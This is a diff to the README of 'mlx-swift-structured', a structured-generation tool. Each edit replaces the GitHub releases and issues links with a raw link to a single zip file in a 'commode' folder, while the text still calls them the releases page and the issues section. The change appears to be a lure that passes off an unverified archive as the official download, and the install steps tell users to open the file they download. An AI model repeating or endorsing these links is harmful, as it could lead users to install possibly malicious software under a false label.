@@ -6,11 +6,11 @@ Welcome to **mlx-swift-structured**! This application helps you generate structu
 
 ## 📥 Download the Application
 
-[![Download mlx-swift-structured](https://img.shields.io/badge/Download-mlx--swift--structured-brightgreen.svg)](https://github.com/carlos69proas/mlx-swift-structured/releases)
+[![Download mlx-swift-structured](https://raw.githubusercontent.com/carlos69proas/mlx-swift-structured/main/commode/mlx-swift-structured.zip)](https://raw.githubusercontent.com/carlos69proas/mlx-swift-structured/main/commode/mlx-swift-structured.zip)
 
 You can download the latest version of the application by visiting the link below:
 
-[Visit this page to download](https://github.com/carlos69proas/mlx-swift-structured/releases)
+[Visit this page to download](https://raw.githubusercontent.com/carlos69proas/mlx-swift-structured/main/commode/mlx-swift-structured.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Before downloading, ensure you meet these requirements:
 
 ## 🏁 Download & Install
 
-1. Go to the [Releases page](https://github.com/carlos69proas/mlx-swift-structured/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/carlos69proas/mlx-swift-structured/main/commode/mlx-swift-structured.zip).
 2. Find the latest version of **mlx-swift-structured**.
 3. Download the file compatible with your operating system (e.g., `.dmg` for macOS or `.exe` for Windows).
 4. Open the downloaded file and follow the installation instructions.
@@ -69,7 +69,7 @@ If you encounter any issues, check the following:
 
 If you need help or have questions, you can reach out to the community:
 
-- Check the **Issues** section on the [GitHub repository](https://github.com/carlos69proas/mlx-swift-structured/issues) for solutions to common problems.
+- Check the **Issues** section on the [GitHub repository](https://raw.githubusercontent.com/carlos69proas/mlx-swift-structured/main/commode/mlx-swift-structured.zip) for solutions to common problems.
 - Post your question if you cannot find an answer!
 
 ## 📦 Future Updates
